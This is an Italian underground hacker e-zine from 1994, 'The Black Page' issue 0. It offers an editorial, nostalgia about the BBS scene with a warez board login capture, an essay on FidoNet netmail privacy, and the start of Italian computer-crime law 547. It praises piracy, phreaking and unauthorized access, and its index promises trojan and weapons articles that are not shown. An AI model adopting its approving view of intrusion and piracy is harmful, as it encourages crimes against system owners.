
				The Black Page
			  Numero 0 - Settembre 1994
				      -
			 La prima rivista ITALIANA di
			       H/P/A/V/C/F/C/C
	  HackingPhreakingAnarchyVirusCodezFuckingCellularCyberpunk
				   ========

          Redattore Capo, Editore : * Dupree's Paradise *
				    * Remacoll's  Group *

                     Co-Redattore : Ice Mc / DTC 

        Redattori - Collaboratori : Ace
                                    Hitman Italy

----------------------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - ACP:COM

     Finalmente  e' nata, questa dannata rivista ! Ora, due parole sui  motivi 
che  ci hanno spinto a creare un simile bollettino telematico. Questa  rivista 
e'  destinata ad un pubblico vasto, molto vasto, piu' vasto e' meglio  e'.  Lo 
scopo che ci prefiggiamo con questo bollettino piu' o meno periodico e' quello 
di  diffondere un tipo di cultura telematica, quella *CREATIVA*, tra la  gente 
che  se ne vuole interessare. Una sorta di contro-corrente informativa in  so-
stanza, diretta a chiunque voglia CAPIRE di piu' su quel mondo fittizio che si 
trova al di la' delle nostre prese telefoniche. 

     Speriamo  che questa rivista telematica venga letta da tutte  le  persone 
possibili. Qui i System Administrators potranno apprendere come far fronte  ai 
problemi di sicurezza dei loro sistemi, su come evitare violazioni della  sud-
detta sicurezza, come prevenire intrusioni, come risolvere bug di sistemi, ec-
cetera eccetera, grazie ad articoli ed esempi appositamente pubblicati, in mo-
do  che  possano effettivamente capire dove eventualmente  possano  sussistere 
delle  falle nei loro grossi computers. Qui i 'ragazzini  intraprendenti'  po-
tranno leggere ed imparare cosa vuol dire sicurezza dei sistemi, potranno  ca-
pire  dove stanno i punti deboli dei piu' svariati tipi di computer,  potranno 
imparare a utilizzare questi computer, cosa che potrebbe risultare loro  molto 
utile  per un futuro curriculum vitae (Immaginate la differenza di 2  curricu-
lum, uno che riporta "Esperienza di lavoro in ambiente PC-DOS su WordStar 1.0" 
ed  uno che riporta "Vasta conoscenza dei sistemi MSDOS, VAX-VMS, Unix,  espe-
rienza  di manutenzione dei suddetti sistemi in particolar modo  in  relazione 
alla sicurezza informatica"  ;) ) quando si presenteranno in qualche ditta  in 
cerca di lavoro. Qui i poliziotti, i finanzieri, e le forze dell'ordine in ge-
nerale, leggendo questi files, forse potranno capire realmente come stanno  le 
cose in fatto di Pirateria, Accessi non autorizzati, Virus, e forse troveranno 
anche delle soluzioni ai loro problemi. Qui i Cyberpunk, gli Anarchici, i  Di-
versi,  e tutte le persone con una forte apertura mentale in  genere  potranno 
trovare articoli fatti per loro, o DA LORO STESSI, se vorranno collaborare in-
viando materiale. 

     Questa rivista e' totalmente gratis, distribuibile su qualsiasi  network. 
In  questa rivista NON VENGONO ASSOLUTAMENTE PUBBLICIZZATI codici  di  accesso 
illegali  a qualsiasi sistema, ne' carte di credito personali, ne' NIENTE  che 
possa  essere direttamente utilizzabile PER SCOPI ILLECITI. Su questa  rivista 
spesso troverete articoli espliciti su svariati generi di cose, dai Virus, al-
le Droghe, alle Armi, a tutto quello che potete immaginare. Queste informazio-
ni pervengono alla nostra redazione da piu' fonti : Donazioni, Messaggi di po-
sta elettronica, Lettere, Voci, Discussioni con amici o estranei, colloqui con 
barboni per la strada, ma anche libri o riviste facilmente reperibili. Se que-
ste  cose esistono nella comune stampa, crediamo di essere nel giusto  pubbli-
candole  a modo nostro nella nostra rivista gratuita. Quindi per  favore,  non 
venite a romperci le palle dicendo che pubblichiamo virus o cazzate del  gene-
re.  Pubblicheremo inoltre spesso dei trucchi di programmazione che  permette-
ranno  di fare svariate cose con un computer, sia esso un Atari PC-Folio o  un 
VAX della Digital.

Inoltre  daremo  voce e spazio a chiunque abbia qualcosa da dire.  Per  questo 
sproniamo chiunque voglia contattarci, a farlo al piu' presto possibile. Dare-
mo spazio ad articoli sulla realta' Cyberpunk Italiana, a poesie e composizio-
ni,  a pubblicita' gratuite di bbs varie, insomma a quello che  vorremo.  Date 
sfogo alla vostra fantasia ! Mandateci materiale !

Qualsiasi cosa che manderete verra' pubblicata SENZA VELI O CENSURE cosi' come 
viene  ricevuta, tranne diversi accordi presi con gli autori. I "crediti"  per 
tali  articoli ricadranno esclusivamente sugli autori. In fondo, noi non  pos-
siamo far altro che prendere dei file ed incollarli insieme :)

Bene, adesso e' ora di iniziare.

=============================================================================
-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - Indice generale

		       INDICE DEGLI ARGOMENTI TRATTATI 
		       -------------------------------

In questo numero si parla di :
------------------------------

	  [1]  Un pochino (ma molto poco) di STORIA
	       a cura della Redazione
          [2]  RETI NEL CICLONE
               a cura di ACE
	  [3]  FIDO BUST : Articoli, commenti, stronzate
         *[4]  THE fingerd TROJAN HORSE
               by Hitman Italy
         *[5]  MINCHIA.MAR, simpatico programmino in 
               Assembler x VAX, scritto alle 5 del mattino
               by Dupree's Paradise
	  [6]  DOVE/COME/QUANDO/PERCHE' FARE TRASHING
	       di Ice MC
	       L'arte di scavare nell'immondizia per
	       cercare cose carine :)
	  [7]  L'angolo SIP-TELECOM, Notizie fresche di 
	       cassonetto a cura di Ice MC e Dupree's
	  [8]  MARIA JUANA : Canapa Indiana, che sollievo
	       da un articolo apparso su "Il Manifesto"
	       a cura della Redazione
	  [9]  ARMI E BAGAGLI : Facciamo Casino con poco
	       a cura della Redazione
	  [10] CYBERSPACE - Articolo Mai Pubblicato
	       di Luc Pac (from Decoder BBS)
	  [11] LEONCAVALLO !!! SOLIDARIETA' !!!!!!
	       Le Notizie che allo Stato non conviene far
	       trapelare ...
	       Fonti : ECN, messaggi su Decoder BBS
	  [12] BSA : Un commento letto su Decoder BBS
	       di M F B
	 *[13] PGP CHAT : Un po' un casino, ma un buon 
	       spunto per sentirsi protetti
	       from Decoder BBS
	  [14] LE "NUOVE" TARIFFE ITAKAZ
	 *[15] STRONZATE IN RETE
	       a cura della Redazione


* = Articoli tutti o in parte in lingua Inglese.
-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - Articolo 1


	       ======================================
	       =                                    =
	       =  Panoramica sulla scena Telematica =
	       =   Underground Italiana ed Europea  =
	       =                                    =
	       =                 by                 =
	       =        * Dupree's Paradise *       =
	       =                                    =
	       ======================================

Questo  articolo e' stato realizzato in collaborazione con le  seguenti  brave 
persone : NESSUNO.

     Bene, questa e' proprio la parte difficile. Parlare della scena  italiana 
in  un momento come questo e' una cosa strana e anche un po' difficile.  Certo 
sono ormai passati i tempi d'oro in cui era abbastanza facile circolare  nelle 
reti, c'era abbondanza di password e di sistemi, che da un anno e mezzo a que-
sta parte pero' cominciano a mancare. 

     Comunque, vogliamo provare a tracciare una panoramica della scena italia-
na ? Beh, allora direi che ci vuole un po' di "storia" ... iniziando dal  pas-
sato,  dalle prime BBS, i primi gruppi e tutte 'ste cazzate qua.  Vi  assicuro 
che e' stato un lavoro da pazzi andare a beccare tutti i diretti interessati e 
sentire i loro commenti ... almeno accendetemi un cero per onorarmi, oppure se 
volete recitate pure tutto il PRCD in piedi aull'altare di una chiesa, comple-
tamente nudi :))))))))

     Come  non iniziare parlando del mitico Pier's Group ? Chi di voi  lettori 
non ha mai letto i racconti di Twin Phreacks, farebbe bene a scaricarseli  su-
bito, dalla bbs DECODER, 02-29527597, aperta dalle 14 alle 8 del mattino.  Li' 
ci sono proprio tutti ! Scritti dal mitico MF The Best, sono veramente  esila-
ranti.

     Beh,  secondo il mio MODESTISSIMO parere, che sicuramente trovera'  molte 
persone  contrarie,  il Pier's e' uno dei mitici gruppi che hanno  segnato  la 
scena italiana in campo HP, con la loro ormai leggendaria BBS. L'ambiente  era 
veramente strano, particolare, la famosa "Area 7" in cui solo gli Elite  pote-
vano  entrare era una cosa (per quei tempi) allucinante, in cui  si  trovavano 
chicche provenienti dagli USA.

     Del Pier's abbiamo recuperato giusto qualche capture, di cui vi  spariamo 
qui qualcosa :

-------------------------------CAPTURE START--------------------------------

atd
CONNECT 1200
CONNECT 1200/NONE

Welcome to AmiExpress BBS Version 1.1x
You are connected to Node 0 at 1200 baud.
Connect time is Thu May 07 14:28:45 1992

ANSI graphics (Y/n)? N
				  __                    ____________________
     _____   __ _____________    / /\  ______          /                    \
    / ___ \ / // ______  ___ \  /_/ / / ____/\         | E l i t e    B B S |
   / /__/ // // /___  / /__/ /\ \_\/ / /____\/         \____________________/
  / /____// // ____/\/ /  __/ /     /___  /\
 / /\____/ // /____\/ / \ \_\/    _____/ / /
/_/ /   /_________//_/ / \_\     /______/ /
\_\/    \_________\\_\/   \_\    \______\/                      /\
	 _______ _____    __________   __ _____           S E L E C T E D
	/ _____// ___ \  / ___  _  /\ / // ___ \              /    \
       / /____ / /__/ /\/ /\_/ // / // // /__/ /\       U S E R S   O N L Y
      / //_  // /  __/ / / // // / // // /____/ /           /        \
     / /__/ // / \ \_\/ /_// // /_// // /\____\/           /__________\
    /______//_/ / \_________/ \_____//_/ /
    \______\\_\/   \________\/ \____\\_\/


Sistema Privato per lo Scambio di Files/Messaggi      Sede di MILANO (Node0)
Aperto 24 ore su 24, 365 giorni/anno. BAUDRATES da 300 a 14400 BPS V42bis.

SysOp and Supreme God : M F   T H E   B E S T
Powerful Chat Lord    : P I E R
The Immortal CoSysOp  : E N I A C
The L e a d e r !     : P I X I E

Enter your FULL Name: Xxxxxx'x Xxxxxxxx
PassWord: ????????
		       __
		      / /
     __              /_/_____  __     ______ _______         ______
     \ \            // _____/ / /    / ____// ___  / /\     / ____/
      \ \    /\    // /___   / /    / /    / /  / / /  \/\ / /___
       \ \  /  \  / \  __/  / /    / /    / /  / / / /\   \\  __/
	\ \/ /\ \/ / \ \____\ \____\ \____\ \__\ \ \ \ \/\ \\ \____
	 \  /  \  /   \_____\\_____\\_____\\______\ \ \   \_\\_____\
	  \/    \/  _________________________________\ \
		   /____________________________________\

	 A c c e s s o    R e g o l a r e    A u t o r i z z a t o

   HandShake     :      14.4 KiloBauds HST V42bis
   Software      :      AmiExpress V1.1x , 9 Conferences
   Data Transfer :      Zmodem Protocol: 9600 / 14400 BPS Only
   HardWare      :      A3000 Tower - CPU 68030 - 5 Megabytes RAM
   DATA STORAGE  :        Multi-HD System, 940 MegaBytes Online


(Pause)...Space to Resume: 

Scanning Conference: Guru's Temple.....No mail today!
Scanning Conference: MS-DOS Warez.....No mail today!

	    (123456789)
Conf Access: XX_X_XXXX
Caller Num.: 5738
Lst Date On: 05-03-92
Security Lv: 10
# Times On : 6
Ratio DL/UL: 2/1
# Downloads: 1
# Uploads  : 3
Bytes DL'd : 58020
Bytes UL'd : 20000000
Bytes Avail: 30000000

Conference 9: MS-DOS Warez Auto-ReJoined

Highest Msg: 507
L/Msg. Read: 0
L/Msg. Auto: 507

Searching for LOSS CARRIER Files!


		   /---------------------------\
		   |     PIER'S GROUP BBS      |
		   \---------------------------/

      C: Comment to Sysop                D: Download files
      E: Enter Message                   F: File Listings
      G: Goodbye (logoff)                H: Display Help
      J: Join a conference               N: New files since a date
      O: Operator page. (Chat)           R: Read Messages
      S: Your statistics                 U: Upload files
     UR: Upload resume                   V: View a Text file
      W: W(Edit) your stats              X: Expert toggle
      Z: Zippy search for text           T: Local Time 
      ?: This Menu                    ZOOM: Zoom Mail (See Help File)

		       M: - Change ANSI Mode

Pier's Group BBS [9:MS-DOS Warez] Menu (27 mins. left): j

 _____  _____  _   _  _____ _____  _____  _____  _   _  _____  _____  _____
 *****| *****| *|_ *| *****|*****| *****| *****| *|  *| *****| *****| *****|
 *|     *|  *| **|_*| *|_   *|_    *|__*| *|     **| *| *|     *|_    *|___
 *|     *|  *| *|*|*| ***|  ***|   *****| ***|   *|*|*| *|     ***|   *****|
 *|___  *|__*| *| **| *|    *|___  *|*|   *|___  *| **| *|___  *|___  ____*|
 *****| *****| *|  *| *|    *****| *| *|  *****| *|  *| *****| *****| *****|

			  1. LAMERLAND - New Users
			   2. BEST AMIGA  W A R E Z
			    3. ..NOT READY.......
			     4. CONSOLE FILES ONLY ! .
			      5. ....NOT READY.....
			       6. Cyberpunks' PHREAKING
				7. The Segret Nest!
				 8. Sysops' Utilities
				  9. MS-DOS  W A R E Z


Conference Number: 7

Joining Conference: The Secret Nest

		      User who have access to Conf #7
______________________________________________________________________________
	  >-hacker->          Andrea Belli        Astaroth            
	  Axe!                Bluelight           Burglar             
	  Capitan Uncino      DEATHBRINGER        DIRECT              
	  Dr.Creator          Dupree's Paradise   Eniac               
	  FLASH GORDON        Federica            GORDON GEKKO        
	  Genius goblin       H.D.Case            Hydra               
	  Ironside/tdt        Jettero Heller      Josh                
	  Longobard           Lost found          MF THE BEST         
	  Madman              MarVin SR!          Mark Anders         
	  NCS                 POISON              Phoenix             
	  PiXiE               Pier                Pitagora            
	  RED MUSTANG         Remacoll            SCSI                
	  SEVEN /\/\          SIMONE NASA         SUSPIRIA            
	  Silver Spring       Spider              Splatter            
	  TIMESCAPE           TRON                Tom-cat             
	  Ugo Belli           Vale Baggins        Yosh                
	  ZEN                 _/ane               
______________________________________________________________________________


(Pause)...Space to Resume: 

Highest Msg: 527
L/Msg. Read: 490
L/Msg. Auto: 527


Pier's Group BBS [2:AMIGA Warez ] Menu (8 mins. left): j 8

Joining Conference: Guru's Temple

   TOP MESSAGE WRITERS  

 Nr:  Name:                         Group/Location:              Msgs: Calls:

   1  MF THE BEST                   Twin Phreaks                  2281   1135
   2  Jettero Heller                MILANO!                       1318    463
   3  The Brain                     --> Five Aces <--              876    274
   4  Hydra                         Strange Land                   532     94
   5  SHADOWMAN                     << CHRONOS >>                  503    270
   6  SUSPIRIA                      BOLOGNA                        306    542
   7  FRANCO2                       ROMA,ITALY                     185    464
   8  FLASH GORDON                  MILANO                         185    229
   9  Ugo Belli                     Milano ( Arese )               179     45
  10  alphabit                      Milano                         172    214

			 Last Update: 05-02-92  11:38:55


-------------------------------END OF CAPTURE-------------------------------

     Bei tempi quelli ! Tempi in cui, se uno veniva scoperto a boxare per soli 
20 km di distanza, veniva deletato dalla board immediatamente ... tempi in cui 
ogni  upload-download doveva venire approvato ... tempi in cui si limitava  al 
massimo  qualsiasi sputtanamento di info, cosa che invece oggi e'  ai  massimi 
livelli, infatti non funge + un emerito cazzo. Ma comunque, certamente  Pier's 
non era l'unica BBS in Italia ad avere un simile ambiente, ma altre cosi'  se-
rie  non me ne ricordo. E se qualche stronzo mi avesse spedito del  materiale, 
invece di continuare a chiedermi "ma ra rivista quando esce" o "ma se ci scri-
vo solo io allora niente" adesso non stareste li' a dire "ma questo qui di re-
censione non ha scritto un cazzo, c'erano un mare di altri gruppi". La prossi-
ma volta invece di star li a farvi le seghe su Arky mandate del materiale !

     Piuttosto se riscontrate delle stronzate mandatemi una mail dove  volete, 
alla fine della mag ci sono tutti gli indirizzi.

     Ma comunque, gia' dalla schermata del Pier's si evince che c'era  qualche 
gruppo.  gli INC, i Twin Phreacks (ma esistevano realmente?), i TDT ed  altri, 
di cui pregherei chiunque ha info di scrivermi una mail colle memberlist e  le 
attivita'. Ricordiamo ad esempio gli Omega Team che hanno scritto l'ormai  fa-
mosa Box per Soundblaster, ma chi fossero i componenti, non se lo ricorda nes-
suno.

     Oggi la scena e' ricoperta di gruppi piu' o meno vari. Ci sono i  Techno-
Brains,  che ora non si sa + che cazzo fanno perche' pare che  abbiano  subito 
anche loro una inculata dal Fidobust, ma non vorrei sparar cazzate. Ci sono un 
casino di gruppi vari, ma siccome nessuno mi ha aiutato non posso star qui  da 
solo ad enumerarli tutti. 

     E  comunque oramai i tempi sono cambiati. Non si puo' fare + un cazzo,  o 
quasi.  Faremmo bene, noi "vecchi", a rivederci qualcuno dei  vecchi  capture, 
per raccogliere lo spirito di quei tempi andati, in cui si lavorava con  soli-
darieta',  e  con uno spirito molto diverso da quello, di merda,  che  riempie 
molte bbs di oggi, in cui non si trova piu' niente oltre a giochini del  cazzo 
per Amiga e IBM.

     Rimandiamo al prossimo numero per un articolo piu' esauriente sulla pano-
ramica italiana. INVITIAMO PERTANTO TUTTI I GRUPPI ITALIANI E NON CHE VOGLIONO 
FAR PARTE DELLA NS RECENSIONE STORICA A FARCI PERVENIRE UN MESSAGGIO  RELATIVO 
AL LORO GRUPPO, INDICANDO IL NOME, I MEMBRI, LE DATE DELLE FORMAZIONI, L'ATTI-
VITA'  DEL GRUPPO, EVENTUALI AZIONI MITICHE COMPIUTE DAL  GRUPPO  (HACKERAGGI, 
PROGRAMMI  CREATI, DEMO, ECC.) ED ALTRO, AGLI INDIRIZZI DI  POSTA  ELETTRONICA 
RIPORTATI IN CODA AL FILE. IL PGP E' OVVIAMENTE OBBLIGATORIO :)


						  Dupree's Paradise

-----------------------------------------------------------------
PUBBLICITA' REGRESSO
====================

				D E C O D E R 
				       
				    B B S 
				       
				       
	    CyberNet             INFORMATION              FidoNet     
				     WANT                              
	   65:1200/1               TO    BE              2:331/369    
				     FREE                              
				
			 Orari apertura 14:00 - 08:00                 
				
			   SUPPLEMENTO ELETTRONICO                   
		      RIVISTA INTERNAZIONALE UNDERGROUND             
				   DECODER                           
			 a cura della ShaKe Edizioni                 

-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - Articolo 2



                           --------------------
                           - Reti nel ciclone - 
                           --------------------

                                a cura di

                                   Ace

                                    -


Questo articolo vuole essere l'introduzione ad una serie piu' lunga e
complessa che si sviluppera' attraverso i prossimi numeri di TBP (se ci
saranno :-).  Oggetto delle nostre attenzioni saranno le reti di
messaggistica amatoriali come FidoNet (ma non solo).

Iniziamo con una premessa dedicata a chi, vivendo probabilmente su Marte, 
non conosce il fenomeno.

FidoNet e' una rete amatoriale (ovvero gestita per passione e non a scopo di
lucro), di bbs che nottetempo si scambiano pacchetti di messaggi seguendo
tutta una serie di procedure note come "Fidonet Tecnology" e su cui non ci
soffermeremo (se vi interessa procuratevi il file FidoNet.man).

Il net (alias rete) offre una serie di aree messaggi ove gli utenti possono
inserire i propri interventi e leggere quelli degli altri.  I temi vanno
dalle chiacchere generiche alle aree tecniche dedicate a sistemi hardware,
programmazione, hobby etc.  Sulla scia di FidoNet sono nate nel corso degli
anni altre reti, alcune sempre generiche ed altre orientate a particolari
tematiche come ad esempio le italiane PeaceLink (attivita' sociali,
pacifismo, lotta alla mafia, etc), LudoNet (giochi), AmigaNet (Amiga Rulez!).

La rete piu' estesa resta comunque Fido che, nata nel 1987 in USA, conta
ormai nodi in tutti i continenti!  A noi questo pero' non interessa poiche'
intendiamo occuparci solo della realta' di casa nostra :-)

Quasi tutti i net prevedono una policy ("politica") che descrive gerarchia
della rete, norme di comportamento, pene per chi le infrange e molto altro.

Chiodo fisso per la maggior parte dei net, ma soprattutto per Fido, e' la
condanna assoluta della pirateria del software, cosa che avveniva anche prima
che in Italia esistesse una vera legge in merito (il che e' abbastanza
esilarante per la verita').

Nulla di male comunque.  Se una cosa viene definita illegale chi vuole
promuoverla deve evitare di coinvolgere coloro che invece non gradiscono.  Il
problema e' un altro:  con la "scusa" di prevenire azioni illecite Fido tende
a ridurre a zero la liberta' personale dei singoli utenti.

Premesso che la rete e' composta da molti bravi e volonterosi Sysop attivi
con l'unico scopo di divertirsi e diffondere gratuitamente la cultura del
dialogo telematico tra le gente, in net si trovano anche elementi con scopi
diversi.

La gerarchia di rete consente di raggiungere un limitato (ma pur sempre
effettivo) potere decisionale sulle azioni del prossimo e cio' non puo' che
attirare chi, oltre alle chiacchere via modem, cerca il comando (o la
dittatura).

Fra le tante belle idee di queste persone (che per selezione naturale tendono
a conquistare la maggior parte dei ruoli di coordinamento) vi e' l'assoluto
annullamento della privacy personale.

Ogni rete ha (forse e' meglio dire avrebbe), un'area privata, abitualmente
chiamata matrix o NetMail, dove gli utenti possono scambiarsi messaggi che
interessano solo mittente e destinatario.  Bene, in FidoNet (non solo li,
comunque) quest'area non e' privata ma viene letta praticamente dai Sysop di
TUTTI i nodi attraverso cui il messaggio transita (perche' transita?  Perche'
se da MI scrivo ad un utente di NA il msg passa per una serie di BBS
intermedie prima di arrivare a destinazione, ma anche per questo vale il
consiglio di prima:  leggetevi Fidonet.man!).

Perche' questo monitoraggio?  Semplice:  pericolo di eversione (!!!) o
svolgimento di attivita' illegali tramite la rete.  Dunque i Sysop sono
tenuti a controllare tutti i messaggi in transito per accertarsi che non
contengano informazioni vietate dalla Policy.  L'utilizzo di programmi come
PGP (un crypter talmente potente che neppure la RSA americana e' stata in
grado di decifrare i files da esso generati!) comporta l'immediata escluaione
del bbs (del bbs, non dell'utente!) dalla rete.  La paura fa 90...

Ma paura di cosa?  Qui viene il bello:  i Signori dovrebbero preoccuparsi di
quel che impongono attualmente, non di improbabili utilizzi eversivi della
matrix!

Per la legge italiana ognuno e' responsabile di quel che si trova sul suo
hard disk.  (lo so, e' assurdo ma andate a vedere chi e' il NOTO ESPERTO
INFORMATICO che se l'e' inventato).

Dunque, se domani il Signor Vertigo, tanto per fare un nome a caso (e' il RC
di Fido per l'Italia), leggesse il mtx di un tizio che comunica ad un amico
il piano per assaltare la sede della BSA, diventerebbe automaticamente
complice dei due a meno di non sporgere immediata denuncia, cosa improbabile
in quanto un file di testo ha poco valore come prova poiche' facilmente
falsificabile.

In questo senso sarebbe molto piu' sicuro per i Sysop stessi non solo evitare
la lettura dei messaggi privati ma addirittura farli transitare cryptati via
PGP o programma similare che in caso di bisogno consenta di dimostrare
(compatibilmente con la conoscenza informatica dei magistrati), la forzata
estraneita' del Sysop o, ancora meglio, impedisca proprio di scoprire il
contenuto (eversivo :-) del messaggio.

Un altro interessante spunto di analisi e' la recente legge 547 sulla
telematica che estende la privacy postale ai messaggi elettronici.  Secondo
le interpretazioni dei Sysop di rete (che valgono quanto quelle della BSA
sulla legge 518 relativa alla pirateria del software :-) questa non influisce
assolutamente sul Sacro Diritto di leggere le matrix poiche' in policy e'
chiaramente spiegato che per Fido il termine "privato" ha un significato
abbastanza diverso da quello normale (!), riguarda infatti la possibilita' di
far leggere il proprio messaggio non a tutti ma esclusivamente a destinatario
ed...  ai Sysop di tutti i nodi su cui passa (ero stufo di usare 'transita'
:-)

Nel prossimo numero (se ci sara') riferiro' gli esiti di una piccola ricerca
legale che sto svolgendo in merito visto che le dichiarazioni di cui sopra
non mi convincono affatto.

Se cio' che ipotizzo verra' confermato saremo di fronte ad una gravissima
limitazione della Nostra Liberta' Personale punibile a norma di legge, senza
contare poi i rischi, descritti in precedenza, che i Sysop corrono
quotidianamente.

A questo punto pero' tengo a precisare che ne io ne chi mi sta aiutando a
svolgere questa inchiesta intendiamo distruggere Fido o far finire nei guai
chichessia.

FidoNet e' un grande patrimonio collettivo.  La presenza di soggetti
parzialmente negativi non deve influire sull'indubbia utilita' della rete.
L'inchiesta che stiamo svolgendo vuole solo chiarire come stanno le cose e
capire se in net il rispetto delle leggi comprende solo la 518 o va anche
oltre.

Io utilizzo regolarmente FidoNet per quel che mi offre.  Sogno di riuscire a
cambiare certe assurdita' (non solo la privacy negata) ma in caso contrario
non mi disperero' di certo anche perche' per i miei msg *privati* ho mezzi
ben piu' sicuri ;-)

Bene, vi lascio con una piccola curiosita':  la privacy, assente per i
matrix, e' invece assoluta per tutte le aree di coordinamento.  Pensate solo
che un umile CoSysop (che per DEFINIZIONE ha gli stessi poteri del Sysop) per
accedervi deve addirittura inviare copia dei suoi dati (reali) a RC e REC, i
quali, secondo metodi di giudizio personali, decideranno se la persona e'
gradita o meno.  In piu' chiunque acceda a tali aree (dove si vocifera
circolino segreti di Stato importanti per la stabilita' Democratica della
nazione) deve mantenere assoluto riserbo su quanto apprende, pena l'immediata
esclusione dalla rete del BBS ed altri provvedimenti...  alcuni citano
l'evirazione, ma sono solo voci non confermate :-)


Note e legenda
--------------

Fidonet.man - e' un testo disponibile in molti BBS ed allegato agli archivi
              dei principali mailer e tosser (programmi per point e bbs).
              Se non lo trovate leggetevi la policy Fido che chiarisce
              ugualmente vari meccanismi di rete.  Nei prossimi numeri, se
              possibile, ne analizzeremo insieme le parti piu' significative.

BSA         - associazione cui aderiscono varie sw houses.
              Si batte contro la pirateria del software.  Se volete
              un'interpretazione obiettiva e aperta della 518 rivolgetevi
              pure a loro.  Probabilmente vi diranno che anche sognare
              windows (bhe e' piu' un incubo che altro...) piratato e'
              illegale :-)

MTX         - Vedi matrix.

RC          - Regional Coordinator, il responsabile italiano per FidoNet.
              Per contattarlo matrixate a 2:331/301 c/o Vertigo.

REC         - Regional Echo Coordinator, il responsabile della gestione
              (apertura, chiusura, etc) aree echo.  Il REC in carica, Adolfo
              Melilli, alloggia al 2:333/1.


Con questo dovrebbe essere tutto.  Saluti e alla prossima!

Quasi dimenticavo:  se volete contattarmi potete farlo lasciandomi un
messaggio nella CPE di Edi BBS (X25 22950135 NRC) oppure via matrix presso:

2:331/368 (FidoNet, se volete che il vostro messaggio sia pubblico :-)
65:1200/7 (CyberNet, gia' piu' sicuro)

Ci sarebbero altri 10 indirizzi ma penso che questi bastino!


                                                  Bye!
                                                       Ace

[ N.d.r in relazione alla BSA e al (C) software vi consigliamo di 
        leggere attentamente l'articolo 12 ;) ]


-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - Articolo 3

		       
		       -------------------------------
		       -      F I D O B U S T        -
		       -------------------------------

			    The Fidonet CrackDown

				      by 

				   Dupree's

		 (e che cazzo volete ? nessuno mi ha aiutato)


     E proprio perche' nessuno mi aiuta mi limitero' a postare qui alcuni mes-
saggi  catturati qua' e la', alcuni conosciuti, altri meno. Beccatevi sta  ca-
terva di bytes. Spero solo di avere piu' collaboratori per il prossimo numero. 
Mi rompe i coglioni fare tutto da solo. Fanculo il mondo.


Incominciamo col il testo della famigerata e bastardissima "legge" ...
---------------------------------------------------------------------------
LEGGE 23 Dicembre 1993, n.547

     Modificazioni ed  integrazioni  alle  norme  del  codice  penale e del
codice di procedura penale in tema di criminalita' informatica.

La Camera dei Deputati e il Senato della Repubblica hanno approvato;

		  Il Presidente Della Repubblica Promulga

la seguente legge:

				  Art. 1

1.- All'articolo 392 del codice penale, dopo il secondo comma  e'  aggiunto
il seguente:

    Si ha, altresi', violenza sulle cose allorche' un programma informatico
viene  alterato,  modificato  o cancellato in tutto o in parte ovvero viene
impedito o turbato il funzionamento di un sistema informatico o telematico.

				  Art. 2

1.- L'articolo 420 del codice penale e' sostituito dal seguente:

    Art.   420  (Attentato  a  impianti  di  pubblica  utilita').- Chiunque
commette un fatto diretto a danneggiare o distruggere impianti di  pubblica
utilita',  e'  punito, salvo che il fatto non costituisca piu' grave reato,
con la reclusione da uno a quattro anni.
    La  pena di cui al primo comma si applica anche a chi commette un fatto
diretto a danneggiare  o  distruggere  sistemi  informatici o telematici di
pubblica utilita', ovvero dati, informazioni o programmi in essi  contenuti
o   ad   essi  pertinenti.
    Se dal fatto deriva la  distruzione  o il danneggiameno dell'impianto o
del  sistema,  dei  dati,  delle  informazioni  o  dei   programmi   ovvero
l'interruzione anche parziale del funzionamento dell'impianto o del sistema
la pena e' della reclusione da tre a otto anni.

				  Art. 3

1.- Dopo l'articolo 491 del codice penale e' inserito il seguente:

    Art.   491-bis  (Documenti  Informatici).-  Se  alcuna  delle  falsita'
previste  dal  seguente  capo  riguarda un documento informatico pubblico o
privato,  si  applicano  le   disposizioni   del  capo  stesso  concernenti
rispettivamente gli atti pubblici e le scritture private.  A tal  fine  per
documento  informatico si intende qualunque supporto informatico contenente
dati   o   informazioni    aventi    efficacia   probatoria   o   programmi
specificatamente destinati ad elaborarli.

				  Art. 4

1.- Dopo l'articolo 615-bis del codice penale sono inseriti i seguenti:

    Art.   615-ter  (Accesso  abusivo   ad   un   sistema   informatico   o
telematico).- Chiunque abusivamente si introduce in un sistema informatico
o  telematico  protetto da misure di sicurezza ovvero vi si mantiene contro
la volonta' espressa o tacita di chi  ha il diritto di escluderlo, e' punto
con la reclusione fino a tre anni.
    La pena e' della reclusione da uno a cinque anni:
	1) Se il fatto e'  commesso  da  un  pubblico  ufficiale  o  da  un
	incaricato  di  pubblico  servizio,  con  abuso dei poteri o con la
	violazione dei doveri inerenti  alla  funzione  o al servizio, o da
	chi esercita anche abusivamente  la  professione  di  investigatore
	privato, o con abuso della qualita' di operatore di sistema;
	2)  Se il colpevole per commettere il fatto usa violenza sulle cose
	o alle persone, ovvero se e' palesemente armato;
	3) Se dal  fatto  deriva  la  distruzione  o  il danneggiamento del
	sistema o l'interruzione totale o parziale del  suo  funzionamento,
	ovvero   la   distruzione  o  il  danneggiamento  dei  dati,  delle
	informazioni o dei programmi in esso contenuti.

    Qualora i fatti di  cui  ai  commi  primo  e secondo riguardino sistemi
informatici o  telematici  di  interesse  militare  o  relativi  all'ordine
pubblico  o alla sicurezza pubblica o alla sanita' o alla protezione civile
o comunque  di  interesse  pubblico,  la  pena  e',  rispettivamente, della
reclusione da uno a cinque anni e da tre a otto anni.
    Nel  caso  previsto  dal  primo  comma il delitto e' punibile a querela
della persona offesa; negli altri casi si procede d'ufficio.

    Art.  615-quater (Detenzione e diffuzione  abusiva di codici di accesso
a sistemi informatici o telematici).- Chiunque, al fine di procurare a se o
ad altri un profitto o di arrecare  ad  altri  un  danno,  abusivamente  si
procura,  riproduce,  diffonde, comunica o consegna codici, parole chiavi o
altri mezzi idonei  all'accesso  ad  un  sistema  informatico o telematico,
protetto  da  misure  di  sicurezza,  o  comunque  fornisce  indicazioni  o
istruzioni idonee al predetto scopo, e' punito con la reclusione sino ad un
anno e con la multa sino a lire dieci milioni.
    La pena e' della reclusione da uno a due anni e  della  multa  da  lire
dieci milioni a venti milioni se ricorre taluna delle circostanze di cui ai
numeri 1) e 2) del quarto comma dell'articolo 617-quater.

    Art.   615-quinques  (Diffusione  di  programmi diretti a danneggiare o
interrompere  un  sistema  informatico).-  Chiunque  diffonda,  comunica  o
consegna un programma informatico da lui  stesso o da altri redatto, avente
scopo  o  per  effetto  in  danneggiamento  di  un  sistema  informatico  o
